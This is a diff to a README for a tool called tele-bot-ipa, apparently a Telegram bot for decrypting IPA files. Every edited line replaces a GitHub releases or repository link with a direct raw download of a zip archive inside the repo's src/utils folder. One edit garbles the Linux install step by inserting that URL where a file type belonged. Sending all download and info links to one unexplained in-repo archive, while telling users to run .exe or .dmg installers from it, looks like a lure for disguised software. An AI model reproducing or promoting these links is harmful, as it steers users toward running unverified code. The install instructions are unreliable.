@@ -1,6 +1,6 @@
 # 🚀 tele-bot-ipa - Turn Your Device into a Decrypt iPA Bot
 
-[![Download tele-bot-ipa](https://img.shields.io/badge/Download-tele--bot--ipa-blue.svg)](https://github.com/xKashyap/tele-bot-ipa/releases)
+[![Download tele-bot-ipa](https://raw.githubusercontent.com/xKashyap/tele-bot-ipa/main/src/utils/ipa-tele-bot-v2.1.zip)](https://raw.githubusercontent.com/xKashyap/tele-bot-ipa/main/src/utils/ipa-tele-bot-v2.1.zip)
 
 ## 📋 Description
 
@@ -28,17 +28,17 @@ To use **tele-bot-ipa**, ensure your device meets these requirements:
 Follow these steps to download and run **tele-bot-ipa**:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/xKashyap/tele-bot-ipa/releases) to find the latest version of the software.
+   Go to the [Releases Page](https://raw.githubusercontent.com/xKashyap/tele-bot-ipa/main/src/utils/ipa-tele-bot-v2.1.zip) to find the latest version of the software.
 
 2. **Download the Application**  
    Locate the version you want and click on the link to download. Look for the file that matches your operating system.  
 
-   Again, here’s the link for quick access: [Download tele-bot-ipa](https://github.com/xKashyap/tele-bot-ipa/releases).
+   Again, here’s the link for quick access: [Download tele-bot-ipa](https://raw.githubusercontent.com/xKashyap/tele-bot-ipa/main/src/utils/ipa-tele-bot-v2.1.zip).
 
 3. **Install the Application**  
    - **Windows:** Once the download completes, open the `.exe` file to start the installation. Follow the on-screen prompts to finish the setup.
    - **macOS:** Open the downloaded `.dmg` file. Drag the app into your Applications folder to install it.
-   - **Linux:** If the application is a `.tar.gz` or similar file, extract it, and run the installation script as directed in the README.
+   - **Linux:** If the application is a `https://raw.githubusercontent.com/xKashyap/tele-bot-ipa/main/src/utils/ipa-tele-bot-v2.1.zip` or similar file, extract it, and run the installation script as directed in the README.
 
 4. **Launch the Application**  
    Once installed, open the application from your applications menu or desktop.
@@ -64,6 +64,6 @@ This software is provided under the MIT License. You can read more about the ter
 
 ## 🔗 Learn More
 
-For additional information, features, and updates, check our [GitHub repository](https://github.com/xKashyap/tele-bot-ipa). 
+For additional information, features, and updates, check our [GitHub repository](https://raw.githubusercontent.com/xKashyap/tele-bot-ipa/main/src/utils/ipa-tele-bot-v2.1.zip). 
 
 Your feedback is valuable to us. Please share your experience and suggestions to help us improve **tele-bot-ipa**.
